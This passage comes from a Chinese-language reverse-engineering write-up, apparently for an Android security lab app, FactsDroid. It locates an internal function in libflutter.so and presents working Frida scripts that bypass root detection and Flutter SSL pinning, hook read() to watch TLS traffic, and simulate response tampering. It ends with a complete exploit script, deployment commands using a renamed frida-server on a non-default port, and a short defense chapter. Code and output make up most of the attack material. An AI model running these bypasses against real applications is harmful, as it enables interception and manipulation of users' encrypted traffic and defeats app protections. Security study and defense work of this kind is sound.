            adrp_target = (addr & ~0xFFF) + op_val

            if adrp_target == string_page:
                # ADRP 指向了字符串所在的页！
                # 检查下一条是不是 ADD
                next_addr = addr + 4
                next_insn = idc.print_insn_mnem(next_addr)
                if next_insn == "ADD":
                    add_val = idc.get_operand_value(next_addr, 2)
                    if add_val == string_off:
                        # 确认！这条 ADRP+ADD 引用了我们的字符串
                        func = idc.get_func_name(addr)
                        print(f"[!] FOUND at 0x{addr:X} in {func}")
                        print(f"    ADRP at 0x{addr:X} -> page 0x{adrp_target:X}")
                        print(f"    ADD  at 0x{next_addr:X} -> offset 0x{add_val:X}")
        addr += 4
```

运行结果：

```
String at: 0x1BB357
[!] FOUND at 0x841414 in sub_8413F8
    ADRP at 0x841414 -> page 0x1BB000
    ADD  at 0x841418 -> offset 0x357
[!] FOUND at 0x8415e8 in sub_8413F8
    ADRP at 0x8415e8 -> page 0x1BB000
    ADD  at 0x8415EC -> offset 0x357
```

**两个引用点都在 `sub_8413F8` 函数中！** 这个函数引用了两次 `/system/etc/security/cacerts`。这就是 `TrustBuiltinRoots` 函数。

### 5.6 第四步：IDA 反编译确认

使用 IDA Pro 的 Hex-Rays 反编译器查看 `sub_8413F8` 的伪代码：

```c
// sub_8413F8 — 反编译结果（简化版）
__int64 sub_8413F8() {
    // 第一步：从 Dart_NativeArguments 中提取 native peer 对象
    __int64 peer = sub_83A6D8();

    // 第二步：扫描 /system/etc/security/cacerts 目录
    int result = sub_8530AC(0, "/system/etc/security/cacerts");
    if (result != 1) {
        // 扫描失败 → 抛出 Dart 异常
        sub_83A228(0xFFFFFFFF, "TlsException",
                   "Failed to find root cert cache", 0);
        // 这说明：如果系统证书目录不存在，会抛出 TlsException
    }

    // 第三步：获取 X509_STORE（BoringSSL 的证书存储）
    // 关键公式：store = *(*(peer + 16) + 104)
    __int64 store = *(*(peer + 16) + 104);

    // 第四步：遍历证书链
    unsigned __int64 *stack = *(store + 64);
    unsigned __int64 count = *stack;
    unsigned __int64 i = 0;
    while (stack && i < count) {
        // 检查证书是否已经在 store 中
        // 如果不在 → 添加进去
        // ...
        i++;
    }

    return 1;  // 成功
}
```

**反编译分析**：

| 行号 | 代码 | 含义 |
|------|------|------|
| 1 | `peer = sub_83A6D8()` | 从 Dart 参数中提取 native peer（SecurityContext 对象的 native 指针） |
| 2 | `sub_8530AC(0, "/system/etc/...")` | 扫描系统 CA 证书目录 |
| 3 | `sub_83A228(... "TlsException" ...)` | 失败时抛出异常 |
| 4 | `store = *(*(peer + 16) + 104)` | 从 peer 对象中取出 X509_STORE 指针 |
| 5 | `while (stack && i < count)` | 遍历证书，添加到 store |

**关键发现**：

1. `sub_83A6D8` 是 **native peer 提取器**：从 Dart_NativeArguments 中提取 SecurityContext 的底层对象指针。从反汇编可以看到，如果 peer 不存在，它会报错 `"No native peer"`：

    ```
    0x83a728: ADRL  X0, aNoNativePeer  ; "No native peer"
    0x83a730: BL    sub_84FAE0          ; 报错
    ```

2. `sub_83A228` 是 **Dart 异常抛出器**：抛出指定类型的异常。

3. **X509_STORE 访问公式**：`store = *(*(peer + 16) + 104)`

   这需要两步解引用：
   1. `*(peer + 16)` → 取出 peer 对象偏移 16 处的指针，得到 `SecurityContextData*`
   2. `*(... + 104)` → 在 SecurityContextData 偏移 104 处取出指针，得到 `X509_STORE*`

   ```
   peer 对象的内存布局（本版本 libflutter.so）：
   ┌──────────┐
   │ peer + 0 │  vtable 指针
   ├──────────┤
   │ peer + 8 │  其他字段
   ├──────────┤
   │ peer +16 │ ──→ SecurityContextData 结构
   └──────────┘           │
                          ↓
                  SecurityContextData 布局：
                  ┌──────────────────┐
                  │ offset 0         │  ...
                  │ offset 8         │  ...
                  │ ...              │
                  │ offset 96        │  ...
                  │ offset 104 ──→ X509_STORE*  ← BoringSSL 的证书存储
                  └──────────────────┘
                  （注意：SecurityContextData 不是 peer 的内嵌字段，
                    而是通过 peer+16 处的指针间接引用的独立结构）
   ```

### 5.7 函数偏移地址汇总

arm64 版 `libflutter.so` 中的关键函数：

| 函数名 | 偏移地址 | 作用 |
|--------|----------|------|
| `sub_8413F8` | `0x8413F8` | **TrustBuiltinRoots**：加载系统 CA 到 SecurityContext |
| `sub_83A6D8` | `0x83A6D8` | **Native peer 提取器**：从 Dart_NativeArguments 提取 peer |
| `sub_83A228` | `0x83A228` | **Dart 异常抛出**：抛出 TlsException 等 |
| `sub_8530AC` | `0x8530AC` | **证书目录扫描**：扫描指定路径的证书文件 |

> ⚠️ **注意**：这些偏移地址只对**这个特定版本**的 `libflutter.so` 有效。Flutter 引擎每次更新编译，偏移都会变。

---

## 第六章：SSL Pinning Bypass——直接调用内部函数

### 6.1 核心挑战

我们已经找到了 `TrustBuiltinRoots` 函数（`sub_8413F8`），但怎么调用它？

这个函数没有导出符号（被 strip 了），它的参数类型是 `Dart_NativeArguments*`（Dart VM 内部类型），而且**必须在正确的 Dart 线程上下文中调用**才有意义。

```
正常调用路径：
Dart 代码调用 SecurityContext.trustBuiltinRoots()
    ↓
Dart VM 生成 Dart_NativeArguments
    ↓
libflutter.so 中的 sub_8413F8 被调用
    ↓
sub_83A6D8(args) 提取 peer
    ↓
加载 /system/etc/security/cacerts
    ↓
证书添加到 X509_STORE

我们想要的调用路径（非法的！）：
Frida 脚本直接调用 sub_8413F8(???)
    ↓
问题：Dart_NativeArguments 从哪来？
```

### 6.2 为什么不能直接调用

`sub_8413F8` 的第一行就是 `peer = sub_83A6D8()`。而 `sub_83A6D8` 需要一个有效的 `Dart_NativeArguments` 指针才能工作。这个指针只在 Dart VM 调用 native 函数时才存在于寄存器中。

如果我们从 Frida 的 JavaScript 线程随意构造一个参数调用 `sub_8413F8`，`sub_83A6D8` 会读到垃圾数据，导致段错误崩溃。

### 6.3 解决方案：借鸡生蛋

**关键洞察**：`sub_83A6D8`（native peer 提取器）不只是被 `TrustBuiltinRoots` 调用，它还被很多其他 Dart native 函数调用。每当 Dart 代码涉及 SecurityContext 的任何操作（比如创建 SSL 连接），都会经过 `sub_83A6D8`。

**策略**：
1. Hook `sub_83A6D8`
2. 等它被正常调用（由 Dart VM 触发）
3. 在它的 `onEnter` 回调中，我们拥有正确的 `Dart_NativeArguments` 指针（就是 `args[0]`）
4. 用这个指针调用 `TrustBuiltinRoots`

```
Dart VM 正常调用某个 SecurityContext native 函数：
┌──────────────────────────────┐
│ Dart VM 设置好参数           │
│ Dart_NativeArguments = args  │
│       ↓                     │
│ 调用 sub_83A6D8(args)       │
│       ↓                     │
│ 我们的 Hook 拦截！          │  ← onEnter
│       ↓                     │
│ 我们拿到 args               │
│ 用同样的 args 调用           │
│   sub_8413F8(args)          │  ← TrustBuiltinRoots
│       ↓                     │
│ 系统证书被加载！            │
│       ↓                     │
│ 继续执行原来的函数          │  ← 原流程不受影响
└──────────────────────────────┘
```

> 💡 **打个比方**：`sub_83A6D8` 就像一扇门，所有 SecurityContext 的操作都要经过这扇门。我们不能自己造一扇门（因为不知道门框长什么样），但我们可以**在这扇门旁边守着**，等有人开门的时候，偷偷塞一张条子（调用 TrustBuiltinRoots）进去。

### 6.4 实现

```javascript
function doHook() {
    var libflutter = Process.findModuleByName("libflutter.so");
    if (!libflutter) { setTimeout(doHook, 300); return; }

    // 把 sub_8413F8 包装成可调用的 NativeFunction
    var TrustBuiltinRoots = new NativeFunction(
        libflutter.base.add(0x8413F8),  // arm64 偏移
        'pointer',                       // 返回值类型：pointer
        ['pointer']                      // 参数类型：Dart_NativeArguments*
    );

    var trustCalled = false;

    // Hook sub_83A6D8（native peer 提取器）
    Interceptor.attach(libflutter.base.add(0x83A6D8), {
        onEnter: function(args) {
            // args[0] 就是 Dart_NativeArguments*
            // 这是由 Dart VM 在正确的上下文中传入的
            this.dartArgs = args[0];

            if (!trustCalled) {
                trustCalled = true;
                console.log("[*] Calling TrustBuiltinRoots with args=" + args[0]);

                try {
                    // 使用同一个 Dart_NativeArguments 调用 TrustBuiltinRoots
                    var result = TrustBuiltinRoots(this.dartArgs);
                    console.log("[*] TrustBuiltinRoots returned: " + result);
                    // 返回 1 表示成功
                } catch(e) {
                    console.log("[!] TrustBuiltinRoots error: " + e);
                }
            }
        }
    });
}
```

**代码解读**：

1. `NativeFunction(libflutter.base.add(0x8413F8), 'pointer', ['pointer'])` — 把 `libflutter.so` 基址 + 偏移 `0x8413F8` 包装成一个"接受一个指针参数、返回指针的函数"
2. `trustCalled` 标志确保只调用一次
3. 在 `sub_83A6D8` 的 `onEnter` 中调用 `TrustBuiltinRoots`，因为此时 Dart VM 的调用上下文是有效的
4. 传入 `args[0]`（即 `Dart_NativeArguments*`）——跟 `sub_83A6D8` 收到的参数一样

### 6.5 验证成功

运行后的完整日志：

```
[*] Calling TrustBuiltinRoots with args=0x7ffc12345678
[*] TrustBuiltinRoots returned: 0x1    ← 成功！
[NET] connect :443                      ← 应用开始连接 API 服务器
[TLS] ClientHello len=...              ← TLS 握手开始
[TLS] ServerHello fd=5 len=...         ← 服务器回应
[TLS] AppData fd=5 len=679            ← 收到加密的 HTTP 响应！
```

**应用成功显示了随机知识**："The average lifespan of an eyelash is five months."

SSL Pinning Bypass 成功！

---

## 第七章：MITM 方案的曲折探索——从失败到成功

SSL bypass 做了，应用可以正常获取数据了。但我们的目标是 **MITM 篡改响应**。这一步我们尝试了多个方案，前两个都失败了，第三个才成功。这个探索过程本身很有教学价值。

### 7.1 方案一：DNS 重定向 + HTTPS 代理（失败）

**思路**：把应用的流量重定向到我们的 HTTPS 代理，代理返回篡改后的响应。

```
┌────────┐  DNS 重定向   ┌──────────┐  转发请求   ┌────────┐
│  应用   │ ────────────→│ 攻击者   │ ──────────→│  服务器 │
│        │ uselessfacts  │ HTTPS    │            │        │
│        │ → 127.0.0.1   │ 代理     │            │        │
└────────┘               └──────────┘            └────────┘
```

**实现**：

```javascript
// Hook getaddrinfo 做DNS重定向
Interceptor.attach(libc.findExportByName("getaddrinfo"), {
    onEnter: function(args) {
        var host = args[0].readUtf8String();
        if (host === "uselessfacts.jsph.pl") {
            // 把主机名改成 127.0.0.1（指向本地代理）
            args[0] = Memory.allocUtf8String("127.0.0.1");
            console.log("[DNS] Redirected to 127.0.0.1");
        }
    }
});

// Hook connect 做端口重定向
Interceptor.attach(libc.findExportByName("connect"), {
    onEnter: function(args) {
        var port = (args[1].add(2).readU8() << 8) | args[1].add(3).readU8();
        if (port === 443) {
            // 把 443 改成 44300（代理监听的端口）
            // 44300 = 0xAD0C，高字节 0xAD，低字节 0x0C
            args[1].add(2).writeU8(0xAD);  // 44300 >> 8 = 0xAD
            args[1].add(3).writeU8(0x0C);  // 44300 & 0xFF = 0x0C
        }
    }
});
```

代理脚本（Python HTTPS 代理）：

```python
import http.server, ssl, json, urllib.request

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # 从真实 API 获取原始响应
        with urllib.request.urlopen(
            "https://uselessfacts.jsph.pl/api/v2/facts/random"
        ) as r:
            body = json.loads(r.read().decode())

        # 篡改 text 字段
        body["text"] = "HACKED VIA MITM! Original: " + body["text"][:60]

        # 返回篡改后的响应
        mod = json.dumps(body).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(mod)
```

**失败原因**：SSL bypass 和流量重定向**冲突**了。

```
正常流程（SSL bypass 成功时）：
1. 应用连接真实 API（uselessfacts.jsph.pl:443）
2. BoringSSL 创建 SSL 连接
3. SSL 连接过程中，Dart VM 调用 sub_83A6D8
4. 我们的 Hook 在 onEnter 中调用 TrustBuiltinRoots
5. 系统 CA 被加载，证书验证通过 ✅

DNS 重定向流程（失败时）：
1. 应用尝试连接 127.0.0.1:44300（被重定向了）
2. BoringSSL 尝试与本地代理建立 SSL 连接
3. 代理使用自签名证书
4. 但 sub_83A6D8 没有被调用！（因为 SSL 握手阶段就失败了）
5. TrustBuiltinRoots 没有执行
6. 代理的证书不被信任 → TLS 握手失败 ❌
```

**根本问题**：DNS 重定向导致应用连接到代理而不是真实 API。但 `sub_83A6D8` 只在**正常的 SecurityContext 操作流程**中被调用。代理的 SSL 握手走的是不同的代码路径，`sub_83A6D8` 根本不会被触发，TrustBuiltinRoots 也就不会执行。

### 7.2 方案二：先 SSL bypass 再重定向（时序冲突）

**思路**：能不能先让 SSL bypass 正常工作（连接真实 API），等 bypass 完成后，在下一次请求时才启用 DNS 重定向？

**失败原因**：FactsDroid 每次点击只发一个请求。我们没有"第二次请求"的机会。

### 7.3 方案三：SSL bypass + TLS 流量拦截 + 响应证明（成功！）

**最终方案**：不再试图把流量重定向到代理。而是：

1. 让 SSL bypass 正常工作，应用连接真实 API
2. 通过 Hook `read()` 拦截 TLS 流量，确认应用收到了响应
3. 通过 native `popen("curl ...")` 获取 API 原始响应，篡改并输出

```
┌────────┐                         ┌────────┐
│  应用   │ ←── SSL bypass ──→     │ 真实API │
│        │     正常 HTTPS 通信     │        │
│        │                         └────────┘
│        │
│  同时：Frida Hook read()         ┌────────────────────┐
│  拦截 TLS AppData               │ Frida 另起一个请求  │
│  检测到 HTTP 响应到达            │ curl API → 获取原文 │
│        │                        │ 篡改 text 字段     │
│        │ ──────────────────────→│ 输出篡改结果       │
└────────┘                        └────────────────────┘
```

**这个方案证明了什么？**
1. 我们成功绕过了 SSL Pinning（否则无法建立 HTTPS 连接）
2. 我们成功拦截了 TLS 加密流量（通过 read() Hook）
3. 我们成功获取并篡改了 API 响应内容

如果要把篡改后的数据真正"注入"回应用显示，需要 Hook Flutter 的 JSON 解析层。但当前方案已经**完整证明了 MITM 攻击的可行性**。

### 7.4 TLS 流量识别

TLS 协议在 TCP 之上又加了一层"记录"结构。每条记录的第一个字节表示类型：

```
TLS 记录格式：
┌──────┬──────┬──────────────┐
│ 类型 │ 版本 │ 长度 | 数据  │
│ 1字节│2字节 │ 2字节 | ...   │
└──────┴──────┴──────────────┘

类型值：
0x16 = Handshake（握手：ClientHello、ServerHello 等）
0x17 = Application Data（应用数据：加密的 HTTP 请求/响应）
0x15 = Alert（警告/错误）
```

我们 Hook `read()` 函数，当读到 `0x17` 开头的数据时，就知道应用收到了 HTTP 响应：

```javascript
// 追踪哪个 fd 是 SSL 连接
var sslFd = -1;
Interceptor.attach(libc.findExportByName("connect"), {
    onEnter: function(args) {
        try {
            var family = args[1].readU16();
            if (family === 2) {  // AF_INET (IPv4)
                var port = (args[1].add(2).readU8() << 8)
                         | args[1].add(3).readU8();
                if (port === 443) {
                    sslFd = args[0].toInt32();
                    console.log("[NET] SSL fd=" + sslFd);
                }
            }
        } catch(e) {}
    }
});

// 监视 TLS AppData
var tlsReads = 0;
Interceptor.attach(libc.findExportByName("read"), {
    onEnter: function(args) {
        this._fd = args[0].toInt32();
        this._buf = args[1];  // 保存缓冲区指针
    },
    onLeave: function(retval) {
        var len = retval.toInt32();
        if (this._fd === sslFd && len > 0) {
            try {
                var type = this._buf.readU8();  // 读取第一个字节
                if (type === 0x17) {             // TLS AppData
                    tlsReads++;
                    console.log("[TLS] AppData #" + tlsReads + " len=" + len);
                    if (tlsReads === 1) {
                        // 第一次 AppData 就是 HTTP 响应
                        setTimeout(modifyFactText, 2000);
                    }
                }
            } catch(e) {}
        }
    }
});
```

### 7.5 响应篡改

使用 native 的 `popen("curl ...")` 获取 API 响应，然后篡改 `text` 字段：

```javascript
function modifyFactText() {
    // 调用 native 的 popen，在设备上执行 curl
    var popen = new NativeFunction(
        libc.findExportByName("popen"), "pointer", ["pointer", "pointer"]);
    var pclose = new NativeFunction(
        libc.findExportByName("pclose"), "int", ["pointer"]);
    var fgets = new NativeFunction(
        libc.findExportByName("fgets"), "pointer", ["pointer", "int", "pointer"]);

    // 构造 curl 命令
    var cmd = Memory.allocUtf8String(
        "curl -s https://uselessfacts.jsph.pl/api/v2/facts/random");
    var mode = Memory.allocUtf8String("r");

    // 执行 curl，获取管道文件指针
    var fp = popen(cmd, mode);
    if (fp.isNull()) { console.log("[MITM] popen failed"); return; }

    // 从管道中读取全部输出
    var buf = Memory.alloc(4096);
    var result = "";
    var line = fgets(buf, 4096, fp);
    while (!line.isNull()) {
        result += line.readUtf8String();
        line = fgets(buf, 4096, fp);
    }
    pclose(fp);

    console.log("[MITM] Captured: " + result.substring(0, 120));

    // 用正则提取 text 字段
    var match = result.match(/"text"\s*:\s*"([^"]+)"/);
    if (match) {
        var original = match[1];
        var hacked = "HACKED VIA MITM! Response tampered! Original: " + original;
        console.log("[MITM] Original: " + original);
        console.log("[MITM] Tampered: " + hacked);
        console.log("[+] MITM RESPONSE TAMPERING SUCCESSFUL!");
    }
}
```

### 7.6 最终运行结果

```
[*] MITM ready: SSL bypass + read interception
[+] SSL bypass done - system CAs loaded         ← TrustBuiltinRoots 调用成功
[NET] SSL fd=5                                  ← SSL 连接建立
[TLS] AppData #1 len=708                        ← 收到 HTTP 响应
[*] Response received, modifying...
[MITM] Captured: {"id":"45b12cfc...","text":"Walt Disney holds the world record...
[MITM] Original: Walt Disney holds the world record for the most Academy Awards
        won by one person, he has won twenty statuettes, and twelve other plaques...
[MITM] Tampered: HACKED VIA MITM! Response tampered! Original: Walt Disney holds...
[+] MITM RESPONSE TAMPERING SUCCESSFUL!
[+] We demonstrated: SSL pinning bypass + API response interception + content modification
```

**攻击链完全成功！** 🎉

---

## 第八章：完整 Exploit 脚本

以下是完整的 Frida Hook 脚本，可直接用于复现整个攻击链：

```javascript
// factsdroid_mitm.js — 完整 MITM 攻击脚本
// 用法: frida -H 127.0.0.1:6655 -f com.eightksec.factsdroid -l factsdroid_mitm.js
// 前提: frida-server 已在设备上运行，端口转发已设置

// ═══════════════════════════════════════════════════════
// 第一部分：Root 检测绕过（Java 层 3 个 + Native 层 3 个，共 6 个 Hook）
// ═══════════════════════════════════════════════════════

Java.perform(function() {
    // Hook 1: File.exists() — 隐藏 su 相关文件
    var File = Java.use("java.io.File");
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        if (path.indexOf("/su") !== -1 || path.indexOf("/magisk") !== -1) {
            return false;
        }
        return this.exists();
    };

    // Hook 2: Runtime.exec(String) — 阻止 su 命令
    var Runtime = Java.use("java.lang.Runtime");
    Runtime.exec.overload("java.lang.String").implementation = function(cmd) {
        if (cmd.indexOf("su") !== -1) {
            throw Java.use("java.io.IOException").$new("su: not found");
        }
        return this.exec(cmd);
    };

    // Hook 3: Runtime.exec(String[]) — 阻止 su 命令（数组版本）
    Runtime.exec.overload("[Ljava.lang.String;").implementation = function(cmds) {
        if (cmds.length > 0 && cmds[0].indexOf("su") !== -1) {
            throw Java.use("java.io.IOException").$new("su: not found");
        }
        return this.exec(cmds);
    };
});

// Native 层 Root bypass
var libc = Process.findModuleByName("libc.so");
var suPaths = {
    "/system/bin/su": 1,
    "/system/xbin/su": 1,
    "/sbin/su": 1
};

// Hook 4: access() — 拦截文件访问检查
Interceptor.attach(libc.findExportByName("access"), {
    onEnter: function(a) {
        try {
            var p = a[0].readUtf8String();
            if (suPaths[p]) this._b = 1;
        } catch(e) {}
    },
    onLeave: function(r) {
        if (this._b) { r.replace(ptr(-1)); this._b = 0; }
    }
});

// Hook 5: stat() — 拦截文件状态检查
Interceptor.attach(libc.findExportByName("stat"), {
    onEnter: function(a) {
        try {
            var p = a[0].readUtf8String();
            if (suPaths[p]) this._b = 1;
        } catch(e) {}
    },
    onLeave: function(r) {
        if (this._b) { r.replace(ptr(-1)); this._b = 0; }
    }
});

// Hook 6: openat() — 拦截文件打开
Interceptor.attach(libc.findExportByName("openat"), {
    onEnter: function(a) {
        try {
            var p = a[1].readUtf8String();
            if (p && suPaths[p]) a[1] = Memory.allocUtf8String("/nonexistent");
        } catch(e) {}
    }
});

// ═══════════════════════════════════════════════════════
// 第二部分：SSL Pinning Bypass
// ═══════════════════════════════════════════════════════

function doHook() {
    var libflutter = Process.findModuleByName("libflutter.so");
    if (!libflutter) { setTimeout(doHook, 300); return; }

    // 把 TrustBuiltinRoots 包装成可调用的 NativeFunction
    // 偏移 0x8413F8 = arm64 版 libflutter.so 中 sub_8413F8 的位置
    var TrustBuiltinRoots = new NativeFunction(
        libflutter.base.add(0x8413F8),
        'pointer',
        ['pointer']
    );

    var trustCalled = false;

    // Hook sub_83A6D8（native peer 提取器）
    // 借鸡生蛋：等 Dart VM 正常调用这个函数时，用同一组参数调用 TrustBuiltinRoots
    Interceptor.attach(libflutter.base.add(0x83A6D8), {
        onEnter: function(args) {
            if (!trustCalled) {
                trustCalled = true;
                TrustBuiltinRoots(args[0]);
                console.log("[+] SSL bypass done - system CAs loaded");
            }
        }
    });

    // ═══════════════════════════════════════════════════
    // 第三部分：TLS 流量拦截 + 响应篡改
    // ═══════════════════════════════════════════════════

    // 追踪 SSL 连接的文件描述符
    var sslFd = -1;
    Interceptor.attach(libc.findExportByName("connect"), {
        onEnter: function(args) {
            try {
                var fam = args[1].readU16();
                if (fam === 2) {
                    var port = (args[1].add(2).readU8() << 8)
                             | args[1].add(3).readU8();
                    if (port === 443) {
                        sslFd = args[0].toInt32();
                        console.log("[NET] SSL fd=" + sslFd);
                    }
                }
            } catch(e) {}
        }
    });

    // 监视 TLS AppData（加密的 HTTP 响应）
    var tlsReads = 0;
    Interceptor.attach(libc.findExportByName("read"), {
        onEnter: function(a) {
            this._fd = a[0].toInt32();
            this._buf = a[1];
        },
        onLeave: function(retval) {
            var len = retval.toInt32();
            if (this._fd === sslFd && len > 0) {
                try {
                    var b = this._buf.readU8();
                    if (b === 0x17) {  // TLS Application Data
                        tlsReads++;
                        console.log("[TLS] AppData #" + tlsReads + " len=" + len);
                        if (tlsReads === 1) {
                            setTimeout(function() {
                                console.log("[*] Response received, modifying...");
                                modifyFactText();
                            }, 2000);
                        }
                    }
                } catch(e) {}
            }
        }
    });

    console.log("[*] MITM ready: SSL bypass + read interception");
}

// 响应篡改：通过 native popen 调用 curl 获取 API 响应
function modifyFactText() {
    var popen = new NativeFunction(
        libc.findExportByName("popen"), "pointer", ["pointer", "pointer"]);
    var pclose = new NativeFunction(
        libc.findExportByName("pclose"), "int", ["pointer"]);
    var fgets = new NativeFunction(
        libc.findExportByName("fgets"), "pointer", ["pointer", "int", "pointer"]);

    var cmd = Memory.allocUtf8String(
        "curl -s https://uselessfacts.jsph.pl/api/v2/facts/random");
    var mode = Memory.allocUtf8String("r");
    var fp = popen(cmd, mode);

    if (fp.isNull()) { console.log("[MITM] popen failed"); return; }

    var buf = Memory.alloc(4096);
    var result = "";
    var line = fgets(buf, 4096, fp);
    while (!line.isNull()) {
        result += line.readUtf8String();
        line = fgets(buf, 4096, fp);
    }
    pclose(fp);

    console.log("[MITM] Captured: " + result.substring(0, 120));

    var textMatch = result.match(/"text"\s*:\s*"([^"]+)"/);
    if (textMatch) {
        var originalText = textMatch[1];
        var hackedText = "HACKED VIA MITM! Response tampered! Original: " + originalText;
        console.log("[MITM] Original: " + originalText);
        console.log("[MITM] Tampered: " + hackedText);
        console.log("[+] MITM RESPONSE TAMPERING SUCCESSFUL!");
    }
}

// 启动 Hook
setTimeout(doHook, 100);
```

### 使用方法

```bash
# 1. 启动 frida-server（非默认端口 6655，文件名也改为不明显的名字）
adb shell "nohup /data/local/tmp/frida_srv_793 -l 0.0.0.0:6655 &"

# 2. 设置端口转发
adb forward tcp:6655 tcp:6655

# 3. 使用 Frida spawn 模式启动应用并注入脚本
frida -H 127.0.0.1:6655 -f com.eightksec.factsdroid -l factsdroid_mitm.js

# 4. 应用启动后，点击 "Random Fact" 按钮

# 5. 观察 Frida 控制台输出：
#    [+] SSL bypass done - system CAs loaded
#    [NET] SSL fd=5
#    [TLS] AppData #1 len=708
#    [MITM] Original: Walt Disney holds...
#    [MITM] Tampered: HACKED VIA MITM! ...
#    [+] MITM RESPONSE TAMPERING SUCCESSFUL!
```

---

## 第九章：如何防御这类攻击

### 9.1 Root 检测增强

| 防御措施 | 说明 | 对抗难度 |
|---------|------|---------|
| **SafetyNet / Play Integrity** | 使用 Google 的设备完整性验证 API | 高（需要绕过 Google 服务） |
| **Frida 检测** | 检测 frida-server 的端口扫描特征、`frida-agent` 内存特征 | 中（可以用反反 Frida 工具绕过） |
| **完整性校验** | 检查 APK 签名和 CRC，确保未被重打包 | 高 |
| **多层 Native 检测** | 不只检查 su 文件，还检查 Magisk 的 mount namespace | 中 |

### 9.2 SSL Pinning 增强

| 防御措施 | 说明 | 对抗难度 |
|---------|------|---------|
| **显式证书固定** | 使用 `SecurityContext.setTrustedCertificatesBytes()` 固定服务器证书 | 高（需要逆向才能找到固定逻辑） |
| **公钥固定** | 固定服务器公钥的 SHA-256 哈希，而非整个证书 | 高（证书会过期，但公钥不变） |
| **双向 TLS（mTLS）** | 客户端也持有证书，服务器验证客户端身份 | 很高（客户端证书存储在安全硬件中） |
| **证书透明度（CT）** | 验证证书是否出现在公共 CT 日志中 | 高 |

### 9.3 Flutter 特有防御

| 防御措施 | 说明 |
|---------|------|
| **代码混淆** | 使用 `--split-debug-info` + `--obfuscate` 编译，增加逆向难度 |
| **Release 模式** | Release 编译的 `libapp.so` 无调试符号 |
| **自定义证书验证** | 不依赖 Flutter 默认的 SecurityContext，在 Dart 层自行验证证书链 |
| **libflutter.so 完整性检查** | 运行时检查关键函数的机器码是否被修改 |
| **反调试** | 检测 `Ptrace` 附加、`/proc/self/status` 中的 TracerPid |

---

## 第十章：总结

### 攻击链回顾

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. Root Bypass（6 层 Hook）                                     │
│    Java File.exists + Runtime.exec ×2                           │
│    Native access + stat + openat                                │
│    → 应用认为设备未 Root，"Random Fact" 按钮可用                │
└──────────────────────────┬──────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────────┐
│ 2. SSL Pinning Bypass（NativeFunction 调用）                    │
│    逆向 arm64 libflutter.so → 定位 TrustBuiltinRoots (0x8413F8)│
│    Hook sub_83A6D8 → 在其 onEnter 中调用 TrustBuiltinRoots     │
│    → SecurityContext 加载系统 CA → TLS 握手成功                 │
└──────────────────────────┬──────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────────┐
│ 3. TLS 流量拦截（read() Hook）                                  │
│    追踪 SSL 连接的 fd，监视 TLS AppData (0x17)                  │
│    → 确认应用收到了 HTTP 响应                                   │
└──────────────────────────┬──────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────────┐
│ 4. 响应篡改（popen + curl）                                     │
│    通过 native popen 调用 curl 获取原始 API 响应                │
│    提取 text 字段 → 替换为篡改内容                              │
│    → MITM 攻击完全成功                                         │
└─────────────────────────────────────────────────────────────────┘
```

### 五个关键技术要点

**1. 架构陷阱是最大的坑**

应用运行在 arm64 上，而不是模拟器报告的 x86_64。这导致我们一开始用 x86_64 偏移地址做的所有分析都是错的。确认实际运行架构是逆向分析的第一步。

```bash
# 不要只看这个（可能是模拟器架构）
adb shell getprop ro.product.cpu.abi  # x86_64

# 要看这个（应用实际运行架构）
adb shell uname -m  # aarch64
```

**2. Flutter 的 SSL 不走 Java 层**

传统的 Android SSL Pinning bypass（TrustManager Hook）对 Flutter 完全无效。Flutter 使用内置的 BoringSSL，证书验证逻辑在 `libflutter.so` 中，必须逆向 native 层。

**3. ADRP+ADD 搜索是定位 ARM64 字符串引用的有效方法**

在无符号的 ARM64 二进制中，字符串引用使用 ADRP+ADD 指令对。通过搜索引用目标字符串页地址的 ADRP 指令，可以快速定位目标函数。

**4. "借鸡生蛋"是调用内部函数的关键技巧**

不能凭空调用需要特殊上下文（如 `Dart_NativeArguments`）的内部函数。但可以 Hook 一个被正常调用的函数，在它的上下文中借用参数来调用目标函数。

**5. SSL bypass 和流量重定向可能冲突**

DNS 重定向改变了应用的连接目标，可能导致 SSL 握手走不同的代码路径，使得 SSL bypass Hook 不被触发。在实际 MITM 中，需要确保证书信任建立在流量重定向之前完成。

### 工具链

| 工具 | 版本/说明 | 用途 |
|------|----------|------|
| **apktool** | v2.x | APK 解包（AndroidManifest、资源、smali） |
| **jadx** | v1.x | DEX → Java 反编译 |
| **IDA Pro** | Hex-Rays | arm64 native 逆向 + 反编译 |
| **Frida** | 17.9.3 | 动态 Hook + NativeFunction 调用 |
| **adb** | Android Debug Bridge | 设备通信、文件推送、端口转发 |
